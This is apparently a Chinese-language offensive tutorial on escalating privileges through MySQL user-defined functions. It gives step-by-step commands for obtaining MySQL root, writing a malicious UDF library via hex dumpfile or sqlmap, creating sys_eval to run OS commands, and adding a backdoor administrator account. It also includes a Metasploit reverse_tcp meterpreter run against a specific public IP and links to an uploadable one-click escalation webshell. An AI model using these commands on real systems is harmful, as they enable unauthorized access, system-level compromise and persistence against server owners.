# **UDF提权**
UDF提权是通过数据库来实现获取目标系统的管理员的shell，root，system。达到从低权限提权到高权限 

^
用户自定义函数，是数据库功能的一种扩展，用户通过自定义函数（动态链接库）实现mysql中无法方便实现的功能，其添加得新函数都可以在sql语句中调用，就像调用version()。

## **提权条件**
有了mysql高权限，如root用户。
获取：
1. 3306端口弱口令爆破。
2. sqlmap 注入的 --sql-shell 模式。sqlmap查表拿到root明文拿去cmd5网站破译 --dump -C "password" -T user -D mysql。
3. 网站的数据库配置文件中拿到明文密码信息。
4. CVE-2012-2122 等这类漏洞直接拿下MYSQL权限。  
5. phpmyadmin爆破登录。
6. 必须能写文件。

^
## **不同版本动态链接库dll或so要写入的位置**
查看版本：select version();
MySQL < 5.0，mysql能检索的目录即可。
5.0<=MySQL<5.1 ,需要导出至目标服务器的系统目录。（如：c/windows/system32/）
MySQL >= 5.1 ，必须放置于 MySQL 安装目录下的 lib\plugin 文件夹下才能创建自定义函数
^
mysql配件位置：select @@plugin_dir;
如果不存在的话可以在 webshell 中找到 MySQL 的安装目录然后手工创建 \lib\plugin\文件夹：
mysql安装目录位置：select @@basedir;

普通linux中mysql：/usr/lib/mysql/plugin/
宝塔linux中mysql：/www/server/mysql/lib/plugin/
windows的phystudy中mysql：\phpstudy_pro\Extensions\MySQL5.7.26\lib\plugin\
^
## **动态链接库dll或so文件来源**
sqlmap中有（/usr/share/sqlmap/data/udf/），不过编码过so_，需要先解码成so
MSF中的没有编码过直接可用 (根目录/embedded/framework/data/exploits/mysql)
或直接下载：<https://sqlsec.lanzoux.com/i4b7jhyhwid>

^
## **写入和利用**
**1.利用十六进制数据字符写入表在转化成dll：**
获取udf.dll文件的十六进制hex值，这里存入txt。
>可以使用工具提取，也可以直接使用mysql函数读转写文件（已知能读写）：
    select hex(load_file("C:/udf.dll")) into dumpfile 'C:/udf.txt'
```
登录目标机数据库，创建表:
use mysql;
create table udf(c LONGBLOB)  //创建udf表，c字段

表中插入值这个十六进制串并hex解码：
insert into udf values(unhex('十六进制串'));

查写入地址：
select @@plugin_dir;

查这个表的结果通过into dumpfile 'xx/lib/plugin/udf.dll'写入：\的路径改为/
select c from udf into dumpfile 'D:/xxx/udf.dll';
```

**实际直接写十六进制串到目标文件也可以，上面作废。十六进制串：**<https://www.sqlsec.com/tools/udf.html>
```
select 0x十六进制串 into dumpfile 'D:/xxx/udf.dll';
```
出现以下报错，把64换成32位的即可。
```
ERROR 1126 (HY000): Can't open shared library 'udf.dll' (errno: 193 )
```


^
^
**2.直接利用sqlmap的post传参将动态链接库文件写入mysql目录：**
SQL 注入且是高权限，plugin 目录可写且需要 secure\_file\_priv 无限制，MySQL 插件目录可以被 MySQL 用户写入，这个时候就可以直接使用 sqlmap 来上传动态链接库，又因为 GET 有**字节长度限制**，所以往往 POST 注入才可以执行这种攻击
```
--secure-file-priv = null  //任何不可读写
--secure-file-priv =        //任何可读写
--secure-file-priv = c:\   //只有C盘可读写
在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径读写文件
在 MySQL 5.5 之后 secure_file_priv 默认是 NULL，这个情况下不可以读写文件
查看配置：
show variables like '%secure%';
```
sqlmap写动态链接库
```
sqlmap -u "http://localhost:30008/" --data="id=1" 
--file-write="/Users/sec/Desktop/lib_mysqludf_sys_64.so" 
--file-dest="/usr/lib/mysql/plugin/udf.so"
```

^
**3.提权利用：**
可以利用动态链接库里定义函数，使用可以操作系统shell的函数，且为最高权限system。
```
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll'; //创建函数

select * from mysql.func; //查看自定义的函数
drop function sys_eval; //删除自定义函数

select sys_eval('whoami'); //使用函数
select sys_eval('sudo ls /root'); 
```
windows加用户并加入管理员组
```
创建一个用户hacker ,密码123456
net user hacker 123456 /add

将hacker用户加入管理员组，有远程登录权限。
net localgroup administrators hacker /add
`
```

^
^
## **MSF直接使用UDF模块**
前提：mysql的root账号知道密码，开启了外链登录，可以写文件。
```
开启：
GRANT ALL PRIVILEGES ON *.* TO '帐号'@'%'IDENTIFIED BY '密码' WITH GRANT OPTION;
```
使用MSF中的exploit/multimysql/mysql_udf_payload模块可以进行UDF提权，注入dll。
MSF会将dll文件写入lib\plugin\目录下（前提是该目录存在，需手工创建），
该dll文件中包含sys_exec(）和sys_eval(）两个函数，但是默认只创建sys_exec(）函数，该函数执行并不会有回显。
我们可以手动创建sys_eval()函数，来执行有回显的命令。
MSF:（前提mysql的root开启了外链）
```
use exploit/multi/mysql/mysql_udf_payload
show options
set payload windows/meterpreter/reverse_tcp
set username root
set password root密码
set rhosts 47.102.195.100
run
```
Navicat中：
```
MSF外链root导入dll后，再sql语句执行后续命令调用执行
select * from mysql.func where name="sys_exec";//查看自义定函数中有无sys_exec了，也可以看到绑定的dll名称
create function sys_eval retums string soname "WqkerHcA.dll";//创建函数sys_eval()绑定dll，dll名字随机需要手动查看或上一条命令查看。
select sys_eval("whoami");/调用函数进行命令执行
```
^
^
# **内网MySQL UDF提权**
假设目标 MySQL 在内网情况下，已经开启了外链，无法直连 MySQL 或者 MySQL账号不允许外连，这个时候一些服务端本地网页脚本（本地localhost连接）就比较方便好用了。

上传这个php程序到目标站点，登录内网mysql和一键UDF提权：<https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php>

或者上传存在sql注入的datagear服务，java8启动，可以连接localhost，读数据，再用sqlmap提权。

或者可执行文件如go程序可以配置连接本地数据库的。

或者端口转发。
^
^
^
# **UDF+反弹shell提权**
UDF 提权的另一种用法，这里的动态链接库被定制过的，
如上传动态链接库后，创建绑定函数，函数可以传入反弹的ip和端口作为参数，运行即可反弹shell，且这个shell为最高权限，实现提权。

